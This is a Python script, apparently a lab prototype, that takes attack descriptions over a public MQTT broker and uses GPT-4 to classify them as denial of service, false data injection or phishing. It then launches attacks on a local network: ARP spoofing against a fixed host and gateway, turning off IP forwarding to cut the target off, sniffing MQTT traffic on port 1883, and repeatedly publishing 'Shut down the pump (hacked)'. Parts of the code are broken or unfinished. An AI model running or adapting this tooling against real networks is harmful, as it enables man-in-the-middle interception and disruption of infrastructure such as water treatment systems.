import os
from urllib import response
import openai
import json
import paho.mqtt.client as mqtt
from langchain.prompts import ChatPromptTemplate
from langchain_openai import ChatOpenAI
from scapy.all import sniff, IP, TCP
import struct
import subprocess
import signal
import time
#from langchain.chat_models import ChatOpenAI
API_KEY = "Insert here"
openai.api_key = API_KEY
llm_model = "gpt-4"


message = ""
sniffed_topic = ""
sniffed_message = ""
def lang_classification ():
    #print(rec)
    llm_model = "gpt-4"
    {
    "attack_class_fdt": False,
    "attack_class_dos": False,
    "attack_class_phsh": False,
    }


    #if(rec): 
        #print ("Inline Classification: ", message)
    
    
    #high_level_attack_description = """ message """
    high_level_attack_description = message
    
    attack_template = """\
    For the following text, extract the following information:

    attack_class_fdt: Does the description suggest innacurate meter readings caused by potential manipulation? \
    Answer True if yes, False if not or unknown.

    attack_class_dos: Does the description indicate flooding or overloading of resources on the network ? \
    Answer True if yes, False if not or unknown.

    attack_class_phsh: Does the description indicate that an employee was tricked or misled into giving up valuable information?
    Answer True if yes, False if not or unknown.

    Format the output as JSON with the following keys:
    attack_class_fdt
    attack_class_dos
    attack_class_phsh

    text:{text}
    
    """
    
    
    prompt_template = ChatPromptTemplate.from_template(attack_template)
    #print(prompt_template)
    messages = prompt_template.format_messages(text=high_level_attack_description)
    chat = ChatOpenAI(temperature=0.0, model=llm_model, openai_api_key= API_KEY)
    response = chat(messages)
    print(response.content)
    json_data = json.loads(response.content)
    return json_data

    
    #The network speed at the water treatment facility has been slowing \
    #down immensely. It seems there is too much traffic coming from \
    #various unknown sources."""
 
 
rec = False

def on_connect(client, userdata, flags, rc):
    print("connected")    
def on_message(client, userdata, msg):
    
    global rec
    global message
    
    print("Received Message: ", str(msg.payload.decode("utf-8")))
    rec = True
    message = str(msg.payload.decode("utf-8"))
    #message += '"""'
    #print (message)
    #print (rec)
    #print (message)
def mqtt_payload_parser(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extract topic
        message = payload[4+topic_len:].decode()  # Extract message
        return topic, message
    except Exception as e:
        print(f"Error parsing MQTT payload: {e}")
        return None, None

def process_packet(packet):
    global sniffed_topic, sniffed_message
    if packet.haslayer(TCP) and packet.haslayer(IP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_sport = packet[TCP].sport
        tcp_dport = packet[TCP].dport
#        print("incomming ")
        # Check if this is MQTT traffic between the two VMs
        if (tcp_sport == 1883 or tcp_dport == 1883):
            # Attempt to parse MQTT payload
            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
#            print("conversation detected")
            if topic and message:
                print(f"MQTT Packet from {ip_src} to {ip_dst}\nTopic: {topic}\nMessage: {message}")
                sniffed_message = message
                sniffed_topic = topic
        
                

def execute_attack(json_response):
    if (json_response["attack_class_dos"]):
        denial_of_service()
    elif (json_response["attack_class_fdt"]):
        print("Perform fake data transfer")
        fake_data_transfer_attack()
    elif (json_response["attack_class_phsh"]):
        print("Perform phishing attack")
def denial_of_service():
    try:
        print("Performing Denial of Serivce Attack....")
        os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
        #Reroutes packets from the MQTT server through this computer.
        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1", ">", "garbage.txt"])
        while True:
            os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "Shut down the pump (hacked)"')
            time.sleep(5)
    except KeyboardInterrupt:
        print("Stopping DDOS process...")
        os.kill(nodeAttack.pid, signal.SIGTERM)

def intercept_modify_forward(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        ip_src = packet[IP].src
        tcp_sport = packet[TCP].sport
#        print("incomming ")
        # Check if this is MQTT traffic between the two VMs
        if (tcp_sport == 1883 and ip_src == "192.168.1."):
            # Attempt to parse MQTT payload
            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
#            print("conversation detected")
            if topic and message:
                print(f"MQTT Packet from {ip_src} to {ip_dst}\nTopic: {topic}\nMessage: {message}")
                sniffed_message = message
                sniffed_topic = topic
def fake_data_transfer_attack():
    #PERFORM PACKET SNIFFING:
    #start_time = time.time()
    print("Performing Fake Data Transfer...")
    print("Sniffing Packets...")
    sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 10)
    print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
    
    try:
        #Enables ip forwarding (hence passing on the packets we get)
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        #Reroutes packets from the MQTT server through this computer.
        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1", ">", "garbage.txt"])
        
        sniff(filter='tcp port 1883', prn=process_packet, store=False)
    except KeyboardInterrupt:
        print("Stopping sniffing")
        os.kill(nodeAttack.pid, signal.SIGTERM)

    """
    try:
        sniff(filter='tcp', prn=intercept_modify_forward, iface=interface)
        #MAN IN THE MIDDLE ATTACK:
        #Enables ip forwarding (hence passing on the packets we get)
        os.system("sudo sysctl -w net.ipv4.ip_forward=0")
        #Reroutes the packets from the gateway router through this computer.
        routerAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.1", "192.168.1.12"])
        time.sleep(10)
        #Reroutes packets from the MQTT server through this computer.
        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1"])
        while True:
            os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "The message has been hijacked"')
            time.sleep(5)
    except KeyboardInterrupt:
        print("Stopping ARPSPOOFING process...")
        os.kill(nodeAttack.pid, signal.SIGTERM)
        os.kill(routerAttack.pid, signal.SIGTERM)
    """
    #TODO: Use identified topic to stop message from going through and send fake message.

client = mqtt.Client()

client.on_connect = on_connect
client.on_message = on_message

client.connect("mqtt.eclipseprojects.io", 1883)

client.subscribe("attackMessage")

client.loop_start()


try:
    while True: 
        #lang_classification()
        if(rec):
            #response = lang_classification()
            json_string = '{"attack_class_fdt": false, "attack_class_dos": true, "attack_class_phsh": false}'
            response = json.loads(json_string)
            execute_attack(response)
            rec = False
            break
except KeyboardInterrupt:
    print("Stopping Attack....")
